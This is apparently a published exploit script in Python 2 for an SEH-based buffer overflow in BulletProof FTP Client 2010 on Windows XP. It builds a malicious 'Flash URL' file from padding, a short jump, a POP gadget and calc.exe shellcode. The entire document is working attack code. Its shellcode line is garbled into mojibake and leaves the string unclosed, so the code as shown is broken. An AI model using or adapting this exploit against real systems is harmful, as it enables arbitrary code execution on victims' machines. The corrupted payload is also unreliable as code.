# Exploit Title: BulletProof FTP Client 2010 - Buffer Overflow (SEH)
#!/usr/bin/python
# coding: utf-8
# Tested on: Windows XP SP3 EN
# Version: 2010.75.0.76
# Date: 19.08.2014 
# Author: metacom

# Credit to previous exploits:
# + http://www.exploit-db.com/exploits/34162/ by Gabor Seljan
# + http://www.exploit-db.com/exploits/18716/ by Vulnerability-Lab

# Download link: http://www.bpftp.com/ 
# Open the -ENTER URL- in filename via File -> Open Flash URL\n";


head="http://"
junk ="\x41" * 89

# 1.\xeb\x06\x90\x90" 
# 2.74C9DE3E   5F POP EDI oleacc.dll
# jump + pop + ShellCode calc.exe Encryption

junk+=("ë>Þt1ÉhcalcT¸ÇÂÿÐ)

exploit=head + junk 
try:
    out_file = open("exploit.txt",'w')
    out_file.write(exploit)
    out_file.close()
except:
    print "Error"
